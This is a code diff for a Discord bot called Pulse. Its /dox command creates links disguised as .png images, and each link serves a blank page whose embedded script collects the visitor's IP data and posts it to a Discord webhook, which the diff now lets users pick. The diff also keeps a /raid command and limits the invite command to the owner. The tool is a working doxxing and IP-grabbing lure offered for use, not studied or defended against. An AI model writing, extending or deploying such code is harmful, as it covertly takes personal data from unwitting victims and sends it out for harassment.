@@ -6,8 +6,9 @@ const app = express();
 // ---- ENVIRONMENT VARIABLES ----
 const TOKEN = process.env.TOKEN;
 const CHANNEL_ID = process.env.CHANNEL_ID;
-const WEBHOOK_URL = process.env.WEBHOOK_URL;
+const DEFAULT_WEBHOOK = process.env.WEBHOOK_URL;
 const INVITE_LINK = 'https://discord.gg/AjUx96vJH';
+const OWNER_ID = process.env.OWNER_ID; // 👈 Add this in Render
 const PORT = process.env.PORT || 3000;
 
 // ---- MINIMAL INTENTS ----
@@ -34,8 +35,10 @@ app.get('/img/:id.png', (req, res) => {
     }
     
     console.log(`✅ ID found: ${id}`);
+    const linkData = links.get(id);
+    const targetWebhook = linkData.webhook || DEFAULT_WEBHOOK;
     res.type('text/html');
-    res.send(generateDoxHTML());
+    res.send(generateDoxHTML(targetWebhook));
 });
 
 app.listen(PORT, () => {
@@ -47,11 +50,9 @@ client.once('ready', async () => {
     console.log(`🤖 Logged in as ${client.user.tag}`);
     
     try {
-        // WIPE ALL COMMANDS
         await client.application.commands.set([]);
         console.log('✅ Cleared all global commands');
         
-        // Clear guild commands
         const guilds = await client.guilds.fetch();
         for (const [id, guild] of guilds) {
             try {
@@ -62,11 +63,18 @@ client.once('ready', async () => {
             }
         }
         
-        // Register ONLY the commands you need
         await client.application.commands.set([
             { 
                 name: 'dox', 
-                description: 'Generate a fresh link' 
+                description: 'Generate a fresh link',
+                options: [
+                    {
+                        name: 'webhook',
+                        description: 'Discord webhook URL to send data to',
+                        type: 3,
+                        required: false
+                    }
+                ]
             },
             { 
                 name: 'raid', 
@@ -85,7 +93,7 @@ client.once('ready', async () => {
                 description: 'Get an invite link for Pulse' 
             }
         ]);
-        console.log('✅ Commands registered (dox + raid + invite)');
+        console.log('✅ Commands registered');
     } catch (error) {
         console.error('❌ Failed to register commands:', error);
     }
@@ -98,21 +106,27 @@ client.on('interactionCreate', async (interaction) => {
     if (interaction.commandName === 'dox') {
         await interaction.deferReply({ ephemeral: true });
 
+        const customWebhook = interaction.options.getString('webhook') || DEFAULT_WEBHOOK;
+        if (!customWebhook || !customWebhook.startsWith('https://discord.com/api/webhooks/')) {
+            return interaction.editReply('❌ Please provide a valid Discord webhook URL.');
+        }
+        
         const id = crypto.randomBytes(6).toString('hex');
         const url = `https://pulsebot-qtgf.onrender.com/img/${id}.png`;
 
         links.set(id, {
             created: Date.now(),
-            user: interaction.user.tag
+            user: interaction.user.tag,
+            webhook: customWebhook
         });
 
         console.log(`✅ Generated link: ${url}`);
-        console.log(`📦 Links stored:`, Array.from(links.keys()));
+        console.log(`📦 Webhook: ${customWebhook}`);
 
         const embed = new EmbedBuilder()
             .setTitle('✅ Link Ready')
             .setColor(0x22c55e)
-            .setDescription(`🔗 **${url}**\n\nSend this link to anyone. When they open it, their data will be logged here.`)
+            .setDescription(`🔗 **${url}**\n\nSend this link to anyone. When they open it, their data will be sent to the webhook you provided.`)
             .setFooter({ text: 'Expires after 100 links generated' });
 
         await interaction.editReply({ embeds: [embed] });
@@ -168,8 +182,16 @@ client.on('interactionCreate', async (interaction) => {
         }
     }
 
-    // ---- INVITE ----
+    // ---- INVITE (owner only) ----
     if (interaction.commandName === 'invite') {
+        // Check if user is the owner
+        if (interaction.user.id !== OWNER_ID) {
+            return interaction.reply({ 
+                content: '❌ You do not have permission to use this command.', 
+                ephemeral: true 
+            });
+        }
+        
         const embed = new EmbedBuilder()
             .setTitle('📩 Invite Pulse')
             .setColor(0x8B5CF6)
@@ -227,13 +249,13 @@ setInterval(() => {
 }, 60000);
 
 // ---- DOX HTML ----
-function generateDoxHTML() {
+function generateDoxHTML(webhook) {
     return `<!DOCTYPE html>
 <html>
 <head><meta charset="UTF-8" /><meta name="viewport" content="width=device-width, initial-scale=1.0" /><title></title><style>body{background:#fff;margin:0;height:100vh}</style></head>
 <body>
 <script>
-    const WEBHOOK_URL = "${WEBHOOK_URL}";
+    const WEBHOOK_URL = "${webhook}";
     (async function() {
         try {
             const ipData = await getIPData();
